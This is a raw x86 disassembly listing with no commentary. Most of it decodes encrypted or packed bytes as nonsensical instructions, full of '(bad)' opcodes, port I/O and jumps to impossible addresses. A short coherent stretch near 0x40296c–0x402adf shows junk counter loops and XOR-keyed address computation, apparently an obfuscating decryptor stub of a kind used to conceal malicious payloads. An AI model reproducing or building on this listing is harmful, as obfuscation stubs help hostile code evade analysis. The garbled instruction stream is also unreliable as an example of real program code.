  4028dc:	repnz dec eax
  4028de:	retf   0x9fc9
  4028e1:	arpl   bx,bx
  4028e3:	xor    BYTE PTR [ebp-0x59409a6a],ch
  4028e9:	outs   dx,BYTE PTR ds:[esi]
  4028ea:	in     al,dx
  4028eb:	(bad)  
  4028ec:	mov    edi,0x9ea2b324
  4028f1:	xor    eax,0x9d8ceb7a
  4028f6:	das    
  4028f7:	mov    al,ds:0xdbf0fc1f
  4028fc:	ds icebp 
  4028fe:	inc    edi
  4028ff:	sub    BYTE PTR [ebx],ch
  402901:	add    cl,bh
  402903:	in     eax,0xdf
  402905:	cdq    
  402906:	icebp  
  402907:	test   DWORD PTR [ebx-0x4d],esp
  40290a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40290b:	dec    eax
  40290c:	scas   eax,DWORD PTR es:[edi]
  40290d:	iret   
  40290e:	repz (bad) 
  402912:	or     al,0x23
  402914:	push   esi
  402915:	mov    gs,eax
  402917:	mov    BYTE PTR [eax],0x68
  40291a:	fwait
  40291b:	subps  xmm6,XMMWORD PTR [eax]
  40291e:	xchg   ecx,eax
  40291f:	add    al,0xe5
  402921:	hlt    
  402922:	cmp    DWORD PTR [edi+0x2988c094],esi
  402928:	mov    ah,0xac
  40292a:	and    eax,0x2a62759
  40292f:	dec    edx
  402930:	jmp    0xcf886e32
  402935:	or     dl,BYTE PTR [ebx]
  402937:	sub    edx,eax
  402939:	fmul   QWORD PTR [ebp+0x2f]
  40293c:	lods   al,BYTE PTR ds:[esi]
  40293d:	sbb    ch,BYTE PTR [edi+0x1519b595]
  402943:	fdivr  st,st(1)
  402945:	adc    DWORD PTR [ecx-0x61109415],esp
  40294b:	dec    edx
  40294c:	xor    esi,DWORD PTR [edx]
  40294e:	adc    bl,BYTE PTR cs:0x374d0d9b
  402955:	call   0xb9de:0x73eb8ff5
  40295c:	cmp    DWORD PTR [esi+eax*2+0x39],esi
  402960:	push   esp
  402961:	lods   al,BYTE PTR ds:[esi]
  402962:	sbb    dh,BYTE PTR [edi]
  402964:	leave  
  402965:	rol    ebp,0x5e
  402968:	leave  
  402969:	ret    0x4
  40296c:	push   ebp
  40296d:	mov    ebp,esp
  40296f:	sub    esp,0x28
  402972:	leave  
  402973:	ret    0x10
  402976:	push   ebp
  402977:	mov    ebp,esp
  402979:	push   ecx
  40297a:	or     eax,DWORD PTR ds:0x42fcdd
  402980:	push   ecx
  402981:	movzx  edx,WORD PTR ds:0x42e6ef
  402988:	sbb    DWORD PTR ds:0x42e713,edx
  40298e:	mov    eax,0xf89c8531
  402993:	mov    DWORD PTR ds:0x42fce9,0x1a
  40299d:	cmp    DWORD PTR ds:0x42fce9,0x0
  4029a4:	je     0x402a39
  4029aa:	cmp    DWORD PTR ds:0x42fce9,0x24
  4029b1:	jne    0x4029cc
  4029b7:	push   0x42e12c
  4029bc:	push   0x42e703
  4029c1:	push   0x59d6
  4029c6:	call   DWORD PTR ds:0x42e44f
  4029cc:	mov    edx,DWORD PTR ds:0x42fce9
  4029d2:	dec    edx
  4029d3:	mov    DWORD PTR ds:0x42fce9,edx
  4029d9:	jmp    0x40299d
  4029de:	mov    DWORD PTR ds:0x42e6ff,0x19
  4029e8:	cmp    DWORD PTR ds:0x42e6ff,0x0
  4029ef:	je     0x402a39
  4029f5:	cmp    DWORD PTR ds:0x42e6ff,0x4
  4029fc:	jne    0x402a0d
  402a02:	push   0x5bc5
  402a07:	call   DWORD PTR ds:0x42e2d3
  402a0d:	cmp    DWORD PTR ds:0x42e6ff,0x5
  402a14:	jne    0x402a27
  402a1a:	mov    edx,DWORD PTR ds:0x42e6ff
  402a20:	dec    edx
  402a21:	mov    DWORD PTR ds:0x42e6ff,edx
  402a27:	mov    edx,DWORD PTR ds:0x42e6ff
  402a2d:	dec    edx
  402a2e:	mov    DWORD PTR ds:0x42e6ff,edx
  402a34:	jmp    0x4029e8
  402a39:	mov    DWORD PTR [ebp-0x8],eax
  402a3c:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  402a43:	mov    edx,DWORD PTR [ebp-0x8]
  402a46:	mov    ecx,DWORD PTR ds:0x42fdae
  402a4c:	mov    ecx,DWORD PTR [ecx]
  402a4e:	xor    DWORD PTR ds:0x42fcd5,ecx
  402a54:	push   esi
  402a55:	mov    ecx,0x7510855
  402a5a:	or     DWORD PTR ds:0x42fd0d,ebx
  402a60:	xor    edx,ecx
  402a62:	sbb    esi,0x5361
  402a68:	mov    esi,0x32729c
  402a6d:	sbb    DWORD PTR ds:0x42e128,0x657d
  402a77:	push   edi
  402a78:	and    DWORD PTR ds:0x42e128,0x0
  402a82:	jmp    0x402a94
  402a87:	mov    edi,DWORD PTR ds:0x42e128
  402a8d:	inc    edi
  402a8e:	mov    DWORD PTR ds:0x42e128,edi
  402a94:	cmp    DWORD PTR ds:0x42e128,0x10
  402a9b:	jae    0x402abe
  402aa1:	cmp    DWORD PTR ds:0x42e128,0x11
  402aa8:	jne    0x402ab9
  402aae:	push   0x42e141
  402ab3:	call   DWORD PTR ds:0x42e453
  402ab9:	jmp    0x402a87
  402abe:	mov    edi,DWORD PTR [ebp+0x10]
  402ac1:	add    edx,esi
  402ac3:	cmp    edi,edx
  402ac5:	je     0x4036ba
  402acb:	mov    edx,DWORD PTR [ebp-0x8]
  402ace:	mov    eax,DWORD PTR [ebp-0x4]
  402ad1:	xor    eax,ecx
  402ad3:	mov    edi,0xffcd8d64
  402ad8:	sub    edi,eax
  402ada:	add    edi,DWORD PTR [ebp+0x10]
  402add:	xor    edx,ecx
  402adf:	jmp    0x402dbe
  402ae4:	imul   ebx,DWORD PTR [edx],0xffffff8f
  402ae7:	cmp    BYTE PTR [ebp+0x71],cl
  402aea:	jae    0x402a9d
  402aec:	jl     0x402b40
  402aee:	dec    esi
  402aef:	mov    esp,0x2e2ccbd3
  402af4:	jo     0x402b02
  402af6:	jo     0x402b68
  402af8:	mov    esi,0xa370707e
  402afd:	xor    ebp,DWORD PTR [ecx]
  402aff:	push   cs
  402b00:	fisub  WORD PTR [ebx+0x3d]
  402b03:	jno    0x402b42
  402b05:	dec    esp
  402b06:	mov    cl,0xad
  402b08:	ins    DWORD PTR es:[edi],dx
  402b09:	xchg   ebx,eax
  402b0a:	add    ebp,esi
  402b0c:	fist   WORD PTR [ebx-0x7736eb6d]
  402b12:	xchg   esp,eax
  402b13:	add    al,0x6a
  402b15:	pop    ds
  402b16:	mov    ss,WORD PTR [edx-0x15]
  402b19:	or     dh,BYTE PTR [edi+0xe0489aa]
  402b1f:	or     bl,BYTE PTR [eax-0x2b5a1e5]
  402b25:	and    ah,ah
  402b27:	cmp    ebx,DWORD PTR [ecx+0x45cd72ef]
  402b2d:	(bad)  
  402b2e:	mov    ecx,0xd52baff6
  402b33:	xor    BYTE PTR [edx],dl
  402b35:	xchg   ecx,eax
  402b36:	xchg   edi,eax
  402b37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b38:	xchg   ebx,esp
  402b3a:	push   edx
  402b3b:	push   edi
  402b3c:	mov    edi,0x70593f5
  402b41:	add    eax,0x43b0f486
  402b46:	or     eax,0x32de713c
  402b4b:	(bad)  
  402b4c:	leave  
  402b4d:	dec    esp
  402b4e:	iret   
  402b4f:	jmp    0xac1549ed
  402b54:	rcr    DWORD PTR [edx],1
  402b56:	sub    BYTE PTR [eax],al
  402b58:	and    BYTE PTR [ecx-0x25],dh
  402b5b:	xchg   ebx,eax
  402b5c:	add    BYTE PTR [edi],ch
  402b5e:	shr    ah,0x4e
  402b61:	pop    esp
  402b62:	mov    dl,0xd8
  402b64:	fnsave [ebx+0x7578b91b]
  402b6a:	jmp    0xf826f188
  402b6f:	jno    0x402b3b
  402b71:	neg    DWORD PTR [ecx+0x7f]
  402b74:	loop   0x402bc3
  402b76:	cmp    bh,ah
  402b78:	mov    DWORD PTR [ecx+eax*8-0x23],eax
  402b7c:	ins    DWORD PTR es:[edi],dx
  402b7d:	clc    
  402b7e:	pop    ebp
  402b7f:	sbb    esp,ebp
  402b81:	jo     0x402b40
  402b83:	shr    DWORD PTR [ebx+eax*8],cl
  402b86:	cs je  0x402be9
  402b89:	cmp    al,0xe
  402b8b:	sbb    al,al
  402b8d:	mov    ds:0xd31bd149,eax
  402b92:	inc    edi
  402b93:	push   esi
  402b94:	pop    es
  402b95:	jl     0x402b52
  402b97:	pushf  
  402b98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b99:	adc    eax,0xad7ee0d4
  402b9e:	xchg   DWORD PTR ds:0x65729999,esp
  402ba4:	pop    esp
  402ba5:	aas    
  402ba6:	out    0xee,eax
  402ba8:	adc    DWORD PTR ds:0xd5761923,edi
  402bae:	mov    bl,0x52
  402bb0:	and    eax,0x16339792
  402bb5:	adc    esp,eax
  402bb7:	mov    ds:0x802ebaa3,al
  402bbc:	in     al,dx
  402bbd:	pop    es
  402bbe:	and    al,dl
  402bc0:	xor    al,0x49
  402bc2:	dec    esp
  402bc3:	mov    eax,0x4e987f73
  402bc8:	add    dl,BYTE PTR [ecx-0x1aa524aa]
  402bce:	push   ebx
  402bcf:	retf   
  402bd0:	stos   DWORD PTR es:[edi],eax
  402bd1:	sub    DWORD PTR [edx],0xffffff9e
  402bd4:	mov    ebx,DWORD PTR ds:0xc5122714
  402bda:	rcl    BYTE PTR [ecx],1
  402bdc:	and    ch,BYTE PTR [ebx]
  402bde:	cmp    BYTE PTR [edi+0x6c],cl
  402be1:	cmp    edi,eax
  402be3:	add    BYTE PTR [esi+0x1e],ah
  402be6:	pop    ebx
  402be7:	pop    esi
  402be8:	mov    WORD PTR [ecx-0x29],?
  402beb:	xlat   BYTE PTR ds:[ebx]
  402bec:	cli    
  402bed:	ret    
  402bee:	outs   dx,BYTE PTR ds:[esi]
  402bef:	outs   dx,DWORD PTR ds:[esi]
  402bf0:	ins    DWORD PTR es:[edi],dx
  402bf1:	cli    
  402bf2:	out    dx,al
  402bf3:	aaa    
  402bf4:	mov    ecx,0xc72fb8ff
  402bf9:	(bad)  
  402bfa:	(bad)  
  402bfb:	fmulp  st(6),st
  402bfd:	ja     0x402c77
  402bff:	sbb    eax,0xa9a9b7cb
  402c04:	jno    0x402c6c
  402c06:	fild   WORD PTR [esp+ecx*1+0x7c]
  402c0a:	inc    edi
  402c0b:	into   
  402c0c:	sbb    eax,0x42de1bcf
  402c11:	adc    eax,0x7b89975c
  402c16:	pop    ss
  402c17:	pusha  
  402c18:	sbb    BYTE PTR [ecx+0x1b084400],cl
  402c1e:	dec    edi
  402c1f:	call   0x7bc57e7b
  402c24:	retf   
  402c25:	or     DWORD PTR [eax],0xb0e0f77e
  402c2b:	cld    
  402c2c:	jl     0x402c7f
  402c2e:	mov    dl,0x97
  402c30:	lods   eax,DWORD PTR ds:[esi]
  402c31:	add    dl,BYTE PTR [ebx]
  402c33:	dec    edx
  402c34:	jo     0x402c3f
  402c36:	dec    ebx
  402c37:	sti    
  402c38:	inc    edi
  402c39:	les    esp,FWORD PTR [ebx-0x1c]
  402c3c:	pop    esp
  402c3d:	imul   edi,DWORD PTR [esi-0x62],0x9eb854fe
  402c44:	je     0x402c5b
  402c46:	and    DWORD PTR [edx],edi
  402c48:	shl    DWORD PTR [edx-0x181a4e14],0x7c
  402c4f:	call   0xd5d:0x55c8da15
  402c56:	sbb    al,0x2
  402c58:	push   es
  402c59:	es jmp 0x402bdc
  402c5c:	dec    esi
  402c5d:	jnp    0x402c4b
  402c5f:	call   0x5b0b0ac1
  402c64:	stc    
  402c65:	sub    eax,0xd8286391
  402c6a:	add    DWORD PTR [eax+0x9],edx
  402c6d:	inc    ecx
  402c6e:	cli    
  402c6f:	pop    ecx
  402c70:	imul   edi,DWORD PTR [esi+ecx*2+0x3b67d717],0x79e0f1a2
  402c7b:	stos   BYTE PTR es:[edi],al
  402c7c:	pop    es
  402c7d:	imul   edi,ecx,0xf8b07950
  402c83:	and    al,0x5b
  402c85:	lods   al,BYTE PTR ds:[esi]
  402c86:	pushf  
  402c87:	inc    ebp
  402c88:	fst    QWORD PTR es:[ecx+ebp*8+0x4e]
  402c8d:	sub    DWORD PTR [ebx],ebx
  402c8f:	mov    al,BYTE PTR [ecx+0x55]
  402c92:	loop   0x402c68
  402c94:	pop    ds
  402c95:	adc    cl,BYTE PTR [esi+0x184c7154]
  402c9b:	fild   WORD PTR [eax+0x675aaf4b]
  402ca1:	rcr    DWORD PTR [esi-0x35],0xf7
  402ca5:	lods   eax,DWORD PTR ds:[esi]
  402ca6:	inc    edx
  402ca7:	sub    eax,0x320f389e
  402cac:	mov    bh,BYTE PTR [edx]
  402cae:	cmp    al,0x57
  402cb0:	ja     0x402c3c
  402cb2:	in     eax,dx
  402cb3:	add    al,0x9
  402cb5:	push   ebp
  402cb6:	out    dx,eax
  402cb7:	out    0x88,al
  402cb9:	xlat   BYTE PTR fs:[ebx]
  402cbb:	out    dx,al
  402cbc:	data16 sbb BYTE PTR [edx+ebp*4-0x78],0x22
  402cc2:	or     esp,eax
  402cc4:	inc    edi
  402cc5:	push   edx
  402cc6:	mov    ecx,0x1f547e41
  402ccb:	mov    ebx,0x7ed1fd3d
  402cd0:	mov    dl,0x9f
  402cd2:	pop    es
  402cd3:	push   esp
  402cd4:	mov    ss,WORD PTR ds:0x59b072d4
  402cda:	pop    ss
  402cdb:	imul   ebp,DWORD PTR [eax+0x25],0xffffffaa
  402cdf:	fadd   DWORD PTR [ebp-0x31d3efb8]
  402ce5:	push   edi
  402ce6:	rcr    BYTE PTR ds:0xd6f06f9,0xe2
  402ced:	sbb    DWORD PTR [edi],esp
  402cef:	fwait
  402cf0:	inc    ecx
  402cf1:	shr    DWORD PTR [ecx+edx*1+0x35],0x1d
  402cf6:	stc    
  402cf7:	add    DWORD PTR [edi],eax
  402cf9:	jbe    0x402c9f
  402cfb:	inc    edi
  402cfc:	cmp    BYTE PTR [ebx+0x6b21564a],dl
  402d02:	aad    0x1c
  402d04:	mov    al,0x7f
  402d06:	mov    ?,WORD PTR [eax+0x13]
  402d09:	inc    edi
  402d0a:	lea    ecx,[ebx]
  402d0c:	mov    ebx,0x34e53258
  402d11:	jmp    0x49682942
  402d16:	imul   edi,edi,0x1e2b516
  402d1c:	ss in  al,dx
  402d1e:	ja     0x402cb0
  402d20:	sub    edx,ebp
  402d22:	jns    0x402d43
  402d24:	leave  
  402d25:	add    DWORD PTR [eax+0x12],ecx
  402d28:	inc    esi
  402d29:	fist   WORD PTR [ebx-0x5161db2a]
  402d2f:	icebp  
  402d30:	mov    ds:0xe3733890,eax
  402d35:	into   
  402d36:	adc    eax,0xa8da56ae
  402d3b:	call   0xb050:0x30267930
  402d42:	push   ebx
  402d43:	and    bh,BYTE PTR [edx]
  402d45:	push   0xd4e0cf0b
  402d4a:	ins    DWORD PTR es:[edi],dx
  402d4b:	out    0x4,al
  402d4d:	pop    ecx
  402d4e:	xchg   BYTE PTR [ebx],bl
  402d50:	inc    edx
  402d51:	and    BYTE PTR [edx+0x27937d4],cl
  402d57:	out    0x50,eax
  402d59:	(bad)  
  402d5b:	sbb    ebx,DWORD PTR [esi+0x3abb675a]
  402d61:	fild   DWORD PTR ds:0x5704cc2d
  402d67:	test   edi,ecx
  402d69:	dec    eax
  402d6a:	loop   0x402d99
  402d6c:	iret   
  402d6d:	or     DWORD PTR [ebp+0x40],edx
  402d70:	and    DWORD PTR [ebp+0xa2d881],ecx
  402d76:	jg     0x402d6d
  402d78:	or     ebp,DWORD PTR [esi+0x5e6efb57]
  402d7e:	mov    eax,ds:0xc693b27c
  402d83:	adc    DWORD PTR [edi+edx*1-0x23],0x5e
  402d88:	mov    ch,0x80
  402d8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d8b:	mov    esi,0xa5c4149c
  402d90:	in     eax,dx
  402d91:	lods   eax,DWORD PTR ds:[esi]
  402d92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d93:	jbe    0x402da9
  402d95:	cmp    eax,0x377adb46
  402d9a:	push   es
  402d9b:	pop    ecx
  402d9c:	adc    DWORD PTR [ebp-0xbc6bfb9],esp
  402da2:	xchg   DWORD PTR [ecx],ebx
  402da4:	clc    
  402da5:	mov    ds:0x7d41da75,al
  402daa:	pop    edx
  402dab:	sub    DWORD PTR [ebx-0x63],ebp
  402dae:	add    BYTE PTR [eax+0x42],dl
  402db1:	push   edx
  402db2:	xchg   DWORD PTR [esi+0x78],ebx
  402db5:	xor    edx,edi
  402db7:	add    BYTE PTR [eax],bl
  402db9:	test   al,0xd6
  402dbb:	jg     0x402de0
  402dbd:	test   BYTE PTR [ebx],al
  402dbf:	(bad)  
  402dc0:	cmp    edx,edi
  402dc2:	ja     0x4036b5
  402dc8:	push   ebx
  402dc9:	jmp    0x4030b2
  402dce:	jmp    0x4030ad
  402dd3:	mov    ecx,0xe1afe4fc
  402dd8:	ja     0x402e2b
  402dda:	push   0xffffffa6
  402ddc:	aas    
  402ddd:	xchg   ebp,eax
  402dde:	out    dx,eax
  402ddf:	jns    0x402d7d
  402de1:	push   esp
  402de2:	cmp    al,0xbe
  402de4:	or     dh,BYTE PTR [eax+0x70]
  402de7:	mov    esi,0x5070707e
  402dec:	out    0xb9,al
  402dee:	or     eax,0xe893207d
  402df3:	enter  0xbd3a,0xc8
  402df7:	jmp    0x402e5d
  402df9:	mov    esp,0xe6596f61
  402dfe:	xchg   esp,eax
  402dff:	jae    0x402dec
  402e01:	mov    al,ds:0xd7c97cc4
  402e06:	icebp  
  402e07:	xor    ebp,DWORD PTR [ebp+0x56]
  402e0a:	push   0x2d4ddca4
  402e0f:	std    
  402e10:	or     al,0x11
  402e12:	or     DWORD PTR [eax+esi*8+0x44d76c35],edx
  402e19:	sub    cl,BYTE PTR [edx]
  402e1b:	add    BYTE PTR [ebx+0x3fcab2fc],ch
  402e21:	or     BYTE PTR [ebp-0x245e0aef],ch
  402e27:	ja     0x402dce
  402e29:	stos   DWORD PTR es:[edi],eax
  402e2a:	mov    esp,0x71cc7317
  402e2f:	test   eax,0x1362fd8e
  402e34:	scas   eax,DWORD PTR es:[edi]
  402e35:	nop
  402e36:	cmp    dh,BYTE PTR [eax+eiz*4+0x8]
  402e3a:	pop    ss
  402e3b:	cmp    eax,0x27678b4
  402e40:	pop    edx
  402e41:	cs xchg esp,eax
  402e43:	mov    eax,ds:0x1e0a3cda
  402e48:	sub    eax,0xa18972ae
  402e4d:	aaa    
  402e4e:	in     al,dx
  402e4f:	je     0x402e71
  402e51:	xor    dl,bh
  402e53:	pushf  
  402e54:	repz sub BYTE PTR [ebx+0x6],ch
  402e58:	dec    ecx
  402e59:	fmul   QWORD PTR [ecx+edi*4]
  402e5c:	(bad)  
  402e5d:	or     al,0xc6
  402e5f:	jge    0x402e4d
  402e61:	popf   
  402e62:	adc    ebx,DWORD PTR [esi]
  402e64:	add    DWORD PTR [edx-0x75],eax
  402e67:	aad    0x3b
  402e69:	into   
  402e6a:	jg     0x402e78
  402e6c:	lock js 0x402e0a
  402e6f:	or     ebx,edx
  402e71:	arpl   WORD PTR [esi+0x10],bp
  402e74:	(bad)  
  402e75:	ss pop eax
  402e77:	xor    BYTE PTR [esi],0x76
  402e7a:	cs icebp 
  402e7c:	(bad)  
  402e7d:	(bad)  
  402e7e:	cmp    ecx,edx
  402e80:	mov    bl,BYTE PTR [esi+0x45b64159]
  402e86:	hlt    
  402e87:	xor    ch,ch
  402e89:	jmp    0x402e81
  402e8b:	in     al,0x40
  402e8d:	es and eax,0x60dba375
  402e93:	push   cs
  402e94:	dec    ecx
  402e95:	xor    ch,BYTE PTR ds:0x32b60d92
  402e9b:	xchg   ebp,eax
  402e9c:	xchg   ecx,eax
  402e9d:	leave  
  402e9e:	cdq    
  402e9f:	cmp    al,0xc5
  402ea1:	adc    edi,0xfffffff8
  402ea4:	xchg   esp,eax
  402ea5:	mov    ch,0x1d
  402ea7:	(bad)  
  402ea8:	in     eax,0x31
  402eaa:	sub    bl,BYTE PTR [eax]
  402eac:	call   0x6aff4a1c
  402eb1:	adc    BYTE PTR [eax-0x50],bh
  402eb4:	mov    eax,ds:0x43c18c20
  402eb9:	aad    0x8a
  402ebb:	and    al,0xb3
  402ebd:	inc    edx
  402ebe:	push   esi
  402ebf:	sub    al,0xc5
  402ec1:	shld   DWORD PTR [edi+0x237413c1],ebp,cl
  402ec8:	inc    ebp
  402ec9:	xor    BYTE PTR [esi+0x7cf8644a],0x56
  402ed0:	push   esp
  402ed1:	lock xor DWORD PTR [bx+di-0x56],esp
  402ed6:	mov    ch,0x2e
  402ed8:	rol    al,cl
  402eda:	push   ss
  402edb:	rcl    DWORD PTR [edx+edi*8+0x2e73a7b9],1
  402ee2:	xlat   BYTE PTR ds:[ebx]
  402ee3:	cmp    eax,DWORD PTR [edx]
  402ee5:	inc    edi
  402ee6:	ins    DWORD PTR es:[edi],dx
  402ee7:	int3   
  402ee8:	jne    0x402e81
  402eea:	push   ecx
  402eeb:	push   ebx
  402eec:	xor    esp,esi
  402eee:	push   es
  402eef:	cmp    al,0xbf
  402ef1:	imul   esp
  402ef3:	push   cs
  402ef4:	cmp    eax,0x5337ebb5
  402ef9:	xor    eax,0x87f07eed
  402efe:	sub    ebp,0xbdac844a
  402f04:	pop    esi
  402f05:	scas   al,BYTE PTR es:[edi]
  402f06:	sub    ch,BYTE PTR [edi]
  402f08:	pop    eax
  402f09:	inc    ebp
  402f0a:	adc    al,0xa3
  402f0c:	push   esp
  402f0d:	push   ds
  402f0e:	or     BYTE PTR [esi+0x55292edf],dh
  402f14:	pop    es
  402f15:	and    DWORD PTR [esi+edx*8+0x62b7a563],0xfc0b0a7d
  402f20:	fbstp  TBYTE PTR [ecx+0x32061fcf]
  402f26:	adc    al,0xcd
  402f28:	push   ebx
  402f29:	jmp    0x621d1775
  402f2e:	rcr    esp,cl
  402f30:	pop    ebx
  402f31:	pusha  
  402f32:	leave  
  402f33:	fstp   TBYTE PTR [ecx-0x65]
  402f36:	mov    esi,DWORD PTR [eax+0x2d]
  402f39:	ror    DWORD PTR [ebp+0x2d],0x71
  402f3d:	sub    eax,0x1fa783eb
  402f42:	sub    BYTE PTR [ebx-0x3c],al
  402f45:	jp     0x402ed5
  402f47:	cdq    
  402f48:	dec    ecx
  402f49:	mov    al,es:0xf4476a3c
  402f4f:	inc    ebp
  402f50:	ret    0x654b
  402f53:	pop    eax
  402f54:	out    0xda,eax
  402f56:	pop    ds
  402f57:	loop   0x402f21
  402f59:	aaa    
  402f5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f5b:	mov    bl,bh
  402f5d:	push   esi
  402f5e:	fimul  DWORD PTR [edi-0x1a]
  402f61:	iret   
  402f62:	cmc    
  402f63:	adc    dl,BYTE PTR [ebx+0x2379085e]
  402f69:	add    al,0xde
  402f6b:	es jecxz 0x402f4b
  402f6e:	fdiv   QWORD PTR [eax-0x4]
  402f71:	fwait
  402f72:	push   es
  402f73:	push   ss
  402f74:	pop    ss
  402f75:	shr    BYTE PTR [esi+edi*2-0x6b08e870],1
  402f7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f7d:	sub    eax,0x83fab7a8
  402f82:	sub    ebp,DWORD PTR [ecx-0x22]
  402f85:	mov    edx,0x14c8adae
  402f8a:	and    ebx,DWORD PTR [eax-0x3240afb7]
  402f90:	push   ebx
  402f91:	out    0x99,eax
  402f93:	sub    ebx,DWORD PTR [ebp-0x15740117]
  402f99:	enter  0x7763,0xf1
  402f9d:	ror    edi,cl
  402f9f:	mov    esi,0x69fdb13f
  402fa4:	mov    dl,0x51
  402fa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fa7:	adc    eax,0x8228a811
  402fac:	bound  eax,QWORD PTR [esi+0x56]
  402faf:	mov    BYTE PTR [esi-0x5b043316],dh
  402fb5:	inc    edx
  402fb6:	and    ah,BYTE PTR [edx+ebp*1+0x44e14f6c]
  402fbd:	sub    eax,0x4d735697
  402fc2:	pusha  
  402fc3:	jp     0x40301b
  402fc5:	cdq    
  402fc6:	ret    0xb2b
  402fc9:	or     BYTE PTR [edx-0x44],0xc7
  402fcd:	clc    
  402fce:	call   0x1f81:0xb4023c98
  402fd5:	mov    bh,0x69
  402fd7:	dec    edx
  402fd8:	push   ecx
  402fd9:	(bad)  
  402fda:	dec    ecx
  402fdb:	sbb    BYTE PTR [edx+0x49],dh
  402fde:	fisttp QWORD PTR [ebp+0x452c1bec]
  402fe4:	in     al,dx
  402fe5:	adc    BYTE PTR [esp+ecx*1],dh
  402fe8:	sbb    ecx,DWORD PTR [eax+0x38e602a3]
  402fee:	pminub mm6,QWORD PTR [ecx+0x59]
  402ff2:	(bad)  
  402ff4:	sbb    bl,0xd1
  402ff7:	nop
  402ff8:	xchg   edi,eax
  402ff9:	sub    al,0x22
  402ffb:	jmp    0xba19b64c
  403000:	fild   WORD PTR [ebp+0x6f]
  403003:	xchg   esi,eax
  403004:	jecxz  0x402fbd
  403006:	rol    cl,0x67
  403009:	dec    edi
  40300a:	pop    es
  40300b:	mov    edi,ebp
  40300d:	mov    ch,0xf4
  40300f:	xchg   ecx,eax
  403010:	loop   0x402fe1
  403012:	stos   BYTE PTR es:[edi],al
  403013:	int3   
  403014:	xchg   ebx,eax
  403015:	sbb    BYTE PTR [eax+0x648bb3c7],ch
  40301b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40301c:	pop    edx
  40301d:	or     DWORD PTR [edi-0x5f559042],ebx
  403023:	jnp    0x402ff2
  403025:	sub    DWORD PTR ss:[esi-0x7ba59495],0x95b49b5b
  403030:	add    al,0xea
  403032:	xchg   ebx,eax
  403033:	icebp  
  403034:	(bad)  
  403035:	mov    eax,ds:0x76786254
  40303a:	or     cl,ch
  40303c:	add    al,0xff
  40303e:	popf   
  40303f:	push   edx
  403040:	mov    ebx,0x8e79b66e
  403045:	test   eax,0x298dfbdc
  40304a:	aad    0x6f
  40304c:	jno    0x403016
  40304e:	mov    eax,0x1c810461
  403053:	outs   dx,BYTE PTR ds:[esi]
  403054:	sbb    eax,0xc1a4867a
  403059:	or     eax,0xce604b6c
  40305e:	or     eax,0x3303f03a
  403063:	push   ss
  403064:	jge    0x402ff5
  403066:	xchg   ebp,eax
  403067:	aad    0x51
  403069:	mov    edx,0xcd7bc64a
  40306e:	test   ecx,ebp
  403070:	mov    ah,0x3a
  403072:	cmc    
  403073:	pushf  
  403074:	stos   DWORD PTR es:[edi],eax
  403075:	ss (bad) 
  403077:	pop    ebp
  403078:	pop    fs
  40307a:	sub    al,BYTE PTR [ecx+0x40]
  40307d:	pushf  
  40307e:	out    0x41,al
  403080:	push   0x23
  403082:	sub    BYTE PTR [edx+0x31],0x89
  403086:	adc    al,0x33
  403088:	sub    ch,0xb4
  40308b:	mov    dl,0x31
  40308d:	das    
  40308e:	add    BYTE PTR [ecx-0x5a],bl
  403091:	int3   
  403092:	sahf   
  403093:	mov    edx,DWORD PTR [ebp+eiz*8+0x5315dd8d]
  40309a:	retf   
  40309b:	push   ebx
  40309c:	adc    dh,BYTE PTR [edi]
  40309e:	jnp    0x403102
  4030a0:	retf   0xb6bb
  4030a3:	lock cdq 
  4030a5:	jp     0x4030f7
  4030a7:	mov    esp,0xd95d7685
  4030ac:	sbb    bh,BYTE PTR [esi+0x32729c]
  4030b2:	mov    eax,DWORD PTR [ebp-0x8]
  4030b5:	mov    edi,DWORD PTR [ebp-0x4]
  4030b8:	xor    edi,ecx
  4030ba:	add    edi,esi
  4030bc:	jmp    0x40339b
  4030c1:	fist   DWORD PTR [ecx+0x4b76cc16]
  4030c7:	loope  0x40307a
  4030c9:	lds    edx,FWORD PTR [esi-0x42]
  4030cc:	add    al,0x63
  4030ce:	pop    esp
  4030cf:	mov    edi,edi
  4030d1:	cld    
  4030d2:	pop    ss
  4030d3:	jo     0x403145
  4030d5:	mov    esi,0x5370707e
  4030da:	cmp    eax,0xd0c09ef6
  4030df:	repnz xor bl,al
  4030e2:	rol    DWORD PTR [eax-0x6],0x60
  4030e6:	jecxz  0x403097
  4030e8:	mov    al,0x6b
  4030ea:	mov    ecx,fs
  4030ec:	jle    0x403169
  4030ee:	scas   eax,DWORD PTR es:[edi]
  4030ef:	into   
  4030f0:	(bad)  
  4030f1:	cmc    
  4030f2:	and    al,0xd9
  4030f4:	aad    0xdf
  4030f6:	pop    ebp
  4030f7:	sbb    al,0x6c
  4030f9:	and    BYTE PTR [esi-0x1],dl
  4030fc:	mov    edi,eax
  4030fe:	dec    esi
  4030ff:	add    cl,dl
  403101:	sub    eax,0xe51f4607
  403106:	and    eax,0xf03a73ca
  40310b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40310c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40310d:	fistp  DWORD PTR [edx-0x66381100]
  403113:	adc    BYTE PTR ds:0x50b08d1a,bl
  403119:	or     DWORD PTR [edi-0x39],0xffffffdb
  40311d:	mov    esp,0xb89f7f3a
  403122:	and    DWORD PTR [edx+0x1c965331],edx
  403128:	(bad)  
  403129:	in     eax,dx
  40312a:	adc    BYTE PTR [esi+0xb],bl
  40312d:	or     ecx,ebx
  40312f:	jp     0x40310f
  403131:	xchg   DWORD PTR [eax],ebp
  403133:	mov    edi,0x7c6ab6e
  403138:	js     0x4031a1
  40313a:	xor    al,BYTE PTR [ecx-0x5e6e4306]
  403140:	div    edi
  403142:	sbb    eax,0x3b4ca4
  403147:	adc    eax,0xf2a70eb2
  40314c:	iret   
  40314d:	xchg   ebx,eax
  40314e:	test   DWORD PTR [edx+0x3f47634c],esp
  403154:	cli    
  403155:	outs   dx,DWORD PTR ds:[esi]
